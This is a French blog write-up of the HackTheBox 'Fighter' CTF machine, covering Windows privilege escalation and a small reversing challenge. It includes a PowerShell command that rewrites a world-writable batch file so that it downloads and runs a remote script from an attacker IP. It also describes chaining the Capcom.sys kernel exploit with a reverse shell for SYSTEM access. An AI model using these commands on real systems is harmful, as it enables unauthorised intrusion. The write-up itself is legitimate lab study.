Shun Goku Satsu
---------------

Sur le système se trouve un utilisateur baptisé *decoder* qui possède un script *clean.bat* word-writable :  

```plain
PS C:\users\decoder> dir

    Directory: C:\users\decoder

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d-r--        20/10/2017     14:40            Contacts
d-r--        02/05/2018     17:28            Desktop
d-r--        20/10/2017     14:40            Documents
d-r--        20/10/2017     14:40            Downloads
d-r--        20/10/2017     14:40            Favorites
d-r--        20/10/2017     14:40            Links
d-r--        20/10/2017     14:40            Music
d-r--        20/10/2017     14:40            Pictures
d-r--        20/10/2017     14:40            Saved Games
d-r--        20/10/2017     14:40            Searches
d-r--        20/10/2017     14:40            Videos
-a---        08/05/2018     23:54         77 clean.bat

PS C:\users\decoder> icacls clean.bat
clean.bat Everyone:(M)
          NT AUTHORITY\SYSTEM:(I)(F)
          FIGHTER\decoder:(I)(F)
          BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\users\decoder> type clean.bat
@echo off
del /q /s c:\users\decoder\appdata\local\TEMP\*.tmp
exit
```

A l'instar d'Unix word-writable signifie que l'on peut modifier le fichier *in-place* donc l'éditer mais pas le supprimer pour le recréer derrière.  

Ce fichier est intéressant car si on lance powershell depuis le .bat il devrait pouvoir s'exécuter en natif donc x64. C'est une cible de choix pour notre *Meterpreter* x64 tant espéré.  

Mais comment éditer un fichier de cette façon sous Windows ? Là encore PowerShell nous vient en aide :  

```plain
$strings = @()
$strings += "c:/windows/system32/windowspowershell/v1.0/powershell.exe -nop -exec bypass -c IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.15.59:443/reflection.ps1')"
$strings | Set-Content "c:\users\decoder\clean.bat"
```

L'idée est alors d'utiliser *Invoke-Expression* + *DownloadString* (comme fait jusqu'à présent) pour exécuter ce code et écrire dans le .bat puis ensuite de l'appeler pour enfin obtenir notre Meterpreter x64. Ce qui fonctionne :)  

Pour autant les exploits d'escalade de privilège suggérés par Metasploit n'aboutissent pas. Il fallait se référer au thème du challenge pour remarquer la présence du driver *capcom.sys* sur le système, ce dernier étant vulnérable [à un exploit PowerShell](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/Capcom/CapCom-GDI-x64Universal.ps1).  

Afin de pouvoir utiliser cet exploit il suffit alors de remplacer notre fichier *reflection.ps1* par la concaténation de l'exploit *Capcom* avec le reverse shell *Nishang* ce qui permet d'obtenir un shell *NT\SYSTEM*.  

You win !
---------

A ce stade on parvient bien sûr à obtenir le flag de l'utilisateur *decoder* (bb6163c184f203af2a31a9c035934297) mais surprise quand on souhaite obtenir le flag de l'administrateur :  

```plain
PS C:\users\administrator\desktop> dir

    Directory: C:\users\administrator\desktop

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---        24/10/2017     17:02       9216 checkdll.dll
-a---        08/01/2018     22:34       9728 root.exe
-a---        24/10/2017     21:06   13767776 vc_redist.x86.exe
```

Il semble que l'on ait un peu de reverse-engineering sur la planche !  

Le binaire *root.exe* ne fait que se servir de la fonction *dll\_check* de la DLL présente en lui passant la chaîne correspondant à *arvg[1]*. Si le résultat de cette fonction est 1 alors le flag nous est remis.  

![Fighter HackTheBox root.exe assembly code](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/fighter_root_exe.png)

On peut obtenir l'adresse de la fonction dans la DLL avec la commande *rabin2 -E checkdll.dll*. Une fois l'adresse obtenue on désassemble dans radare2 :  

![HackTheBox Fighter checkdll.dll disassembly](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/fighter_checkdll.png)

La première chose à faire est de déterminer l’étendue de la fonction en regardant jusqu'où s'arrête chaque embranchement. Ici on voit qu'on ira pas plus loin que l'adresse 0x10001032 et que la fonction n'effectue pas de call. Elle est donc très courte.  

Ensuite on remarque rapidement une structure de boucle avec l'initialisation d'un compteur (xor eax, eax) qui est incrémenté juste avant d'être comparé à 0xA (10).  

On remarque aussi un pointeur vers la chaîne de caractères *Fm`fEhOl}h* et un XOR réalisé avec la valeur 0x9 sur un octet.  

La seule difficulté dans ce code c'est l'instruction *sub* à 0x10001008 qui s'explique plus loin via l'utilisation des tableaux de caractères en 0x10001010 et 0x1000101a : la distance entre la chaîne saisie et la chaîne hardcodée est stockée dans edx ce qui permet d'énumérer les caractères des deux chaînes avec le même compteur (pour l'un on rajoute edx dans le calcul).  

Le décodage se fait en une ligne de Python :  

```plain
>>> "".join([chr(ord(c) ^ 9) for c in "Fm`fEhOl}h"])
'OdioLaFeta'
```

On peut alors utiliser Wine (si on dispose de toutes les DLL nécessaires) ou d'un système Windows pour récupérer le flag final :  

![HackTheBox Fighter final flag](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/fighter_final_flag.png)

Game over
---------

Ce CTF aura été un sacré casse-tête, la partie reverse aura été la plus facile :p  

A noter que la restriction sur l'extension ps1 pouvait être bypassée en utilisant l'extension .psm1 qui est aussi autorisée par PowerShell.  


*Published October 07 2018 at 17:41*